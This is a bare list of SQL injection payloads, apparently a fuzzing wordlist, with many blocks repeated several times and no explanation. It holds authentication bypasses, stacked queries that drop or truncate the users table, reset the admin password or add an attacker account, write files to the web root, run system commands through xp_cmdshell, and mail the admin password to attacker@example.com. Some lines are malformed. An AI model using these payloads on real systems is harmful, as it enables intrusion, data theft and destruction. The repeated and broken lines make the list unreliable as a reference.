1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND 'a' LIKE 'b%';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND LENGTH('abc')=3;--
1'; DECLARE @var INT; SET @var = (SELECT COUNT(*) FROM users); IF @var > 1 RAISERROR('Too many rows', 16, 1); --
1'; EXEC sp_executesql N'SELECT * FROM users WHERE username = @username AND password = @password', N'@username NVARCHAR(50), @password NVARCHAR(50)', @username = 'admin', @password = 'password'; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); EXEC sp_send_dbmail @recipients='attacker@example.com', @subject='SQLi attack', @body=@var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); PRINT @var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); EXEC xp_cmdshell @var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); EXEC xp_cmdshell 'echo ' + @var + ' > C:\output.txt'; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); EXEC master.dbo.xp_cmdshell @var; --
1'; CREATE VIEW malicious_view AS SELECT * FROM users; --
1'; CREATE TRIGGER malicious_trigger ON users FOR INSERT AS INSERT INTO logs (log_data) VALUES ('User inserted'); --
1'; CREATE FUNCTION malicious_function() RETURNS TABLE AS RETURN (SELECT * FROM users); SELECT * FROM malicious_function(); --
1'; EXEC('SELECT * FROM users WHERE username = ''' + 'admin' + ''' AND password = ''' + 'password' + ''''); --
1'; MERGE INTO users USING (SELECT 'admin' AS username, 'password' AS password) AS attacker ON users.username = attacker.username WHEN MATCHED THEN UPDATE SET users.password = attacker.password; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT username + ':' + password FROM users); PRINT @var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT username + ':' + password FROM users FOR XML PATH('')); PRINT @var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT username + CHAR(58) + password FROM users); PRINT @var; --
 OR 1=(SELECT 1/0); --
' OR 1=(SELECT COUNT(*) FROM non_existent_table); --
' OR 1=(SELECT CAST('test' AS INT)); --
' OR 1=(SELECT COALESCE(username, 'admin')) FROM users WHERE username='admin'; --
' OR 1=(SELECT CASE WHEN (1=1) THEN 'a' ELSE (SELECT username FROM users WHERE username='admin') END); --
' OR 1=(SELECT 1 FROM users WHERE username='admin' AND (SELECT COUNT(*) FROM users)>0); --
' OR 1=(SELECT username FROM users WHERE username='admin' AND (SELECT COUNT(*) FROM users)>1); --
' OR 1=(SELECT IFNULL(username, 'admin') FROM users WHERE username='admin'); --
' OR 1=(SELECT CONCAT(username, password) FROM users WHERE username='admin'); --
' OR 1=(SELECT NULLIF(username, '') FROM users WHERE username='admin'); --
' OR 1=(SELECT 1/0); --
' OR 1=(SELECT CAST('test' AS INT)); --
' OR 1=(SELECT COALESCE(username, 'admin')) FROM users WHERE username='admin'; --
' OR 1=(SELECT CASE WHEN (1=1) THEN 'a' ELSE (SELECT username FROM users WHERE username='admin') END); --
' OR 1=(SELECT IFNULL(username, 'admin') FROM users WHERE username='admin'); --
' OR 1=(SELECT CONCAT(username, password) FROM users WHERE username='admin'); --
' OR 1=(SELECT NULLIF(username, '') FROM users WHERE username='admin'); --
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT TOP 1 password FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT MIN(password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT MAX(password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT AVG(password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT SUM(password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT CONCAT(username, '-', password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT COALESCE(password, 'No password') FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT NULLIF(password, '') FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT CAST(password AS INT) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT CHAR(65) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT ASCII(SUBSTRING(password,1,1)) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM non_existent_table);
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users WHERE password LIKE '%pass%');
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) UNION ALL SELECT NULL,NULL,NULL;
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) ORDER BY 1;
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) GROUP BY username;
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT() FROM users) HAVING COUNT() > 1;
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) LIMIT 1,1;
' OR 'a'='a
' OR 'a'='b
' OR '1'='1
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM non_existent_table);--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users WHERE password LIKE '%pass%');--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) UNION ALL SELECT NULL,NULL,NULL;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) ORDER BY 1;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) GROUP BY username;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) HAVING COUNT(*) > 1;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) LIMIT 1,1;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) UNION SELECT * FROM sensitive_data;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) INTO OUTFILE '/var/www/html/output.txt';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR XML PATH;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR JSON PATH;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR XML RAW;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR JSON AUTO;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR JSON AUTO, INCLUDE_NULL_VALUES;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) INTO DUMPFILE '/var/www/html/output.txt';--
1'; UPDATE users SET password='new_password' WHERE username='admin';--
1'; DELETE FROM users WHERE username='admin';--
1'; INSERT INTO users (username, password) VALUES ('attacker', 'hacked');--
1'; CREATE TABLE malicious_table (data VARCHAR(255));--
1'; DROP TABLE users;--
1'; ALTER TABLE users ADD COLUMN email VARCHAR(255);--
1'; TRUNCATE TABLE users;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users WHERE password LIKE '%pass%') OR 1=1;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND '1'='1';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND '1'='2';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND 'a'='a';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND 'a'='b';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND 'a' LIKE 'a%';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND 'a' LIKE 'b%';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND LENGTH('abc')=3;--
1'; DECLARE @var INT; SET @var = (SELECT COUNT(*) FROM users); IF @var > 1 RAISERROR('Too many rows', 16, 1); --
1'; EXEC sp_executesql N'SELECT * FROM users WHERE username = @username AND password = @password', N'@username NVARCHAR(50), @password NVARCHAR(50)', @username = 'admin', @password = 'password'; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); EXEC sp_send_dbmail @recipients='attacker@example.com', @subject='SQLi attack', @body=@var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); PRINT @var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); EXEC xp_cmdshell @var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); EXEC xp_cmdshell 'echo ' + @var + ' > C:\output.txt'; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); EXEC master.dbo.xp_cmdshell @var; --
1'; CREATE VIEW malicious_view AS SELECT * FROM users; --
1'; CREATE TRIGGER malicious_trigger ON users FOR INSERT AS INSERT INTO logs (log_data) VALUES ('User inserted'); --
1'; CREATE FUNCTION malicious_function() RETURNS TABLE AS RETURN (SELECT * FROM users); SELECT * FROM malicious_function(); --
1'; EXEC('SELECT * FROM users WHERE username = ''' + 'admin' + ''' AND password = ''' + 'password' + ''''); --
1'; MERGE INTO users USING (SELECT 'admin' AS username, 'password' AS password) AS attacker ON users.username = attacker.username WHEN MATCHED THEN UPDATE SET users.password = attacker.password; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT username + ':' + password FROM users); PRINT @var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT username + ':' + password FROM users FOR XML PATH('')); PRINT @var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT username + CHAR(58) + password FROM users); PRINT @var; --
 OR 1=(SELECT 1/0); --
' OR 1=(SELECT COUNT(*) FROM non_existent_table); --
' OR 1=(SELECT CAST('test' AS INT)); --
' OR 1=(SELECT COALESCE(username, 'admin')) FROM users WHERE username='admin'; --
' OR 1=(SELECT CASE WHEN (1=1) THEN 'a' ELSE (SELECT username FROM users WHERE username='admin') END); --
' OR 1=(SELECT 1 FROM users WHERE username='admin' AND (SELECT COUNT(*) FROM users)>0); --
' OR 1=(SELECT username FROM users WHERE username='admin' AND (SELECT COUNT(*) FROM users)>1); --
' OR 1=(SELECT IFNULL(username, 'admin') FROM users WHERE username='admin'); --
' OR 1=(SELECT CONCAT(username, password) FROM users WHERE username='admin'); --
' OR 1=(SELECT NULLIF(username, '') FROM users WHERE username='admin'); --
' OR 1=(SELECT 1/0); --
' OR 1=(SELECT CAST('test' AS INT)); --
' OR 1=(SELECT COALESCE(username, 'admin')) FROM users WHERE username='admin'; --
' OR 1=(SELECT CASE WHEN (1=1) THEN 'a' ELSE (SELECT username FROM users WHERE username='admin') END); --
' OR 1=(SELECT IFNULL(username, 'admin') FROM users WHERE username='admin'); --
' OR 1=(SELECT CONCAT(username, password) FROM users WHERE username='admin'); --
' OR 1=(SELECT NULLIF(username, '') FROM users WHERE username='admin'); --
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT TOP 1 password FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT MIN(password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT MAX(password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT AVG(password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT SUM(password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT CONCAT(username, '-', password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT COALESCE(password, 'No password') FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT NULLIF(password, '') FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT CAST(password AS INT) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT CHAR(65) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT ASCII(SUBSTRING(password,1,1)) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM non_existent_table);
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users WHERE password LIKE '%pass%');
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) UNION ALL SELECT NULL,NULL,NULL;
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) ORDER BY 1;
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) GROUP BY username;
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT() FROM users) HAVING COUNT() > 1;
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) LIMIT 1,1;
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM non_existent_table);--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users WHERE password LIKE '%pass%');--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) UNION ALL SELECT NULL,NULL,NULL;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) ORDER BY 1;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) GROUP BY username;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) HAVING COUNT(*) > 1;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) LIMIT 1,1;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) UNION SELECT * FROM sensitive_data;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) INTO OUTFILE '/var/www/html/output.txt';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR XML PATH;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR JSON PATH;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR XML RAW;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR JSON AUTO;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR JSON AUTO, INCLUDE_NULL_VALUES;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) INTO DUMPFILE '/var/www/html/output.txt';--
1'; UPDATE users SET password='new_password' WHERE username='admin';--
1'; DELETE FROM users WHERE username='admin';--
1'; INSERT INTO users (username, password) VALUES ('attacker', 'hacked');--
1'; CREATE TABLE malicious_table (data VARCHAR(255));--
1'; DROP TABLE users;--
1'; ALTER TABLE users ADD COLUMN email VARCHAR(255);--
1'; TRUNCATE TABLE users;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users WHERE password LIKE '%pass%') OR 1=1;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND '1'='1';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND '1'='2';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND 'a'='a';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND 'a'='b';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND 'a' LIKE 'a%';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND 'a' LIKE 'b%';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND LENGTH('abc')=3;--
1'; DECLARE @var INT; SET @var = (SELECT COUNT(*) FROM users); IF @var > 1 RAISERROR('Too many rows', 16, 1); --
1'; EXEC sp_executesql N'SELECT * FROM users WHERE username = @username AND password = @password', N'@username NVARCHAR(50), @password NVARCHAR(50)', @username = 'admin', @password = 'password'; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); EXEC sp_send_dbmail @recipients='attacker@example.com', @subject='SQLi attack', @body=@var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); PRINT @var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); EXEC xp_cmdshell @var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); EXEC xp_cmdshell 'echo ' + @var + ' > C:\output.txt'; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); EXEC master.dbo.xp_cmdshell @var; --
1'; CREATE VIEW malicious_view AS SELECT * FROM users; --
1'; CREATE TRIGGER malicious_trigger ON users FOR INSERT AS INSERT INTO logs (log_data) VALUES ('User inserted'); --
1'; CREATE FUNCTION malicious_function() RETURNS TABLE AS RETURN (SELECT * FROM users); SELECT * FROM malicious_function(); --
1'; EXEC('SELECT * FROM users WHERE username = ''' + 'admin' + ''' AND password = ''' + 'password' + ''''); --
1'; MERGE INTO users USING (SELECT 'admin' AS username, 'password' AS password) AS attacker ON users.username = attacker.username WHEN MATCHED THEN UPDATE SET users.password = attacker.password; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT username + ':' + password FROM users); PRINT @var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT username + ':' + password FROM users FOR XML PATH('')); PRINT @var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT username + CHAR(58) + password FROM users); PRINT @var; --
 OR 1=(SELECT 1/0); --
' OR 1=(SELECT COUNT(*) FROM non_existent_table); --
' OR 1=(SELECT CAST('test' AS INT)); --
' OR 1=(SELECT COALESCE(username, 'admin')) FROM users WHERE username='admin'; --
' OR 1=(SELECT CASE WHEN (1=1) THEN 'a' ELSE (SELECT username FROM users WHERE username='admin') END); --
' OR 1=(SELECT 1 FROM users WHERE username='admin' AND (SELECT COUNT(*) FROM users)>0); --
' OR 1=(SELECT username FROM users WHERE username='admin' AND (SELECT COUNT(*) FROM users)>1); --
' OR 1=(SELECT IFNULL(username, 'admin') FROM users WHERE username='admin'); --
' OR 1=(SELECT CONCAT(username, password) FROM users WHERE username='admin'); --
' OR 1=(SELECT NULLIF(username, '') FROM users WHERE username='admin'); --
' OR 1=(SELECT 1/0); --
' OR 1=(SELECT CAST('test' AS INT)); --
' OR 1=(SELECT COALESCE(username, 'admin')) FROM users WHERE username='admin'; --
' OR 1=(SELECT CASE WHEN (1=1) THEN 'a' ELSE (SELECT username FROM users WHERE username='admin') END); --
' OR 1=(SELECT IFNULL(username, 'admin') FROM users WHERE username='admin'); --
' OR 1=(SELECT CONCAT(username, password) FROM users WHERE username='admin'); --
' OR 1=(SELECT NULLIF(username, '') FROM users WHERE username='admin'); --
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT() FROM users) HAVING COUNT() > 1;
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) LIMIT 1,1;
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM non_existent_table);--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users WHERE password LIKE '%pass%');--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) UNION ALL SELECT NULL,NULL,NULL;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) ORDER BY 1;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) GROUP BY username;--
' OR 1=1--
' OR 1=2--
' OR 'a'='a'--
' OR 'a'='b'--
1 OR 'a'='a'
#error base
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT TOP 1 password FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT MIN(password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT MAX(password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT AVG(password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT SUM(password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT CONCAT(username, '-', password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT COALESCE(password, 'No password') FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT NULLIF(password, '') FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT CAST(password AS INT) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT CHAR(65) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT ASCII(SUBSTRING(password,1,1)) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM non_existent_table);
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users WHERE password LIKE '%pass%');
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) UNION ALL SELECT NULL,NULL,NULL;
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) ORDER BY 1;
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) GROUP BY username;
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT() FROM users) HAVING COUNT() > 1;
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) LIMIT 1,1;
' OR 'a'='a
' OR 'a'='b
' OR '1'='1
' OR '1'='2
' OR 1=1--
' OR 1=2--
' OR 'a'='a'--
' OR 'a'='b'--
1 OR 'a'='a'
1 OR 'a'='b'
1 OR '1'='1'
1 OR '1'='2'
' OR 1/0 --
' OR 1/1 --
' OR 1/2 --
' OR 'a'='a'--
' OR 'a'='b'--
' OR '1'='1'--
' OR '1'='2'--
UNION ALL VALUES (1,2,3)--
UNION ALL VALUES (1,2,3)--
UNION ALL VALUES (1,2,3)--
1 OR 'a'='a'
1 OR 'a'='b'
1 OR '1'='1'
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM non_existent_table);--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users WHERE password LIKE '%pass%');--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) UNION ALL SELECT NULL,NULL,NULL;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) ORDER BY 1;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) GROUP BY username;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) HAVING COUNT(*) > 1;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) LIMIT 1,1;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) UNION SELECT * FROM sensitive_data;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) INTO OUTFILE '/var/www/html/output.txt';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR XML PATH;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR JSON PATH;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR XML RAW;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR JSON AUTO;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR JSON AUTO, INCLUDE_NULL_VALUES;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) INTO DUMPFILE '/var/www/html/output.txt';--
1'; UPDATE users SET password='new_password' WHERE username='admin';--
1'; DELETE FROM users WHERE username='admin';--
1'; INSERT INTO users (username, password) VALUES ('attacker', 'hacked');--
1'; CREATE TABLE malicious_table (data VARCHAR(255));--
1'; DROP TABLE users;--
1'; ALTER TABLE users ADD COLUMN email VARCHAR(255);--
1'; TRUNCATE TABLE users;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users WHERE password LIKE '%pass%') OR 1=1;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND '1'='1';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND '1'='2';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND 'a'='a';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND 'a'='b';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND 'a' LIKE 'a%';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND 'a' LIKE 'b%';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND LENGTH('abc')=3;--
1'; DECLARE @var INT; SET @var = (SELECT COUNT(*) FROM users); IF @var > 1 RAISERROR('Too many rows', 16, 1); --
1'; EXEC sp_executesql N'SELECT * FROM users WHERE username = @username AND password = @password', N'@username NVARCHAR(50), @password NVARCHAR(50)', @username = 'admin', @password = 'password'; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); EXEC sp_send_dbmail @recipients='attacker@example.com', @subject='SQLi attack', @body=@var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); PRINT @var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); EXEC xp_cmdshell @var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); EXEC xp_cmdshell 'echo ' + @var + ' > C:\output.txt'; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); EXEC master.dbo.xp_cmdshell @var; --
1'; CREATE VIEW malicious_view AS SELECT * FROM users; --
1'; CREATE TRIGGER malicious_trigger ON users FOR INSERT AS INSERT INTO logs (log_data) VALUES ('User inserted'); --
1'; CREATE FUNCTION malicious_function() RETURNS TABLE AS RETURN (SELECT * FROM users); SELECT * FROM malicious_function(); --
1'; EXEC('SELECT * FROM users WHERE username = ''' + 'admin' + ''' AND password = ''' + 'password' + ''''); --
1'; MERGE INTO users USING (SELECT 'admin' AS username, 'password' AS password) AS attacker ON users.username = attacker.username WHEN MATCHED THEN UPDATE SET users.password = attacker.password; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT username + ':' + password FROM users); PRINT @var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT username + ':' + password FROM users FOR XML PATH('')); PRINT @var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT username + CHAR(58) + password FROM users); PRINT @var; --
 OR 1=(SELECT 1/0); --
' OR 1=(SELECT COUNT(*) FROM non_existent_table); --
' OR 1=(SELECT CAST('test' AS INT)); --
' OR 1=(SELECT COALESCE(username, 'admin')) FROM users WHERE username='admin'; --
' OR 1=(SELECT CASE WHEN (1=1) THEN 'a' ELSE (SELECT username FROM users WHERE username='admin') END); --
' OR 1=(SELECT 1 FROM users WHERE username='admin' AND (SELECT COUNT(*) FROM users)>0); --
' OR 1=(SELECT username FROM users WHERE username='admin' AND (SELECT COUNT(*) FROM users)>1); --
' OR 1=(SELECT IFNULL(username, 'admin') FROM users WHERE username='admin'); --
' OR 1=(SELECT CONCAT(username, password) FROM users WHERE username='admin'); --
' OR 1=(SELECT NULLIF(username, '') FROM users WHERE username='admin'); --
' OR 1=(SELECT 1/0); --
' OR 1=(SELECT CAST('test' AS INT)); --
' OR 1=(SELECT COALESCE(username, 'admin')) FROM users WHERE username='admin'; --
' OR 1=(SELECT CASE WHEN (1=1) THEN 'a' ELSE (SELECT username FROM users WHERE username='admin') END); --
' OR 1=(SELECT IFNULL(username, 'admin') FROM users WHERE username='admin'); --
' OR 1=(SELECT CONCAT(username, password) FROM users WHERE username='admin'); --
' OR 1=(SELECT NULLIF(username, '') FROM users WHERE username='admin'); --
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT TOP 1 password FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT MIN(password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT MAX(password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT AVG(password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT SUM(password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT CONCAT(username, '-', password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT COALESCE(password, 'No password') FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT NULLIF(password, '') FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT CAST(password AS INT) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT CHAR(65) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT ASCII(SUBSTRING(password,1,1)) FROM users);
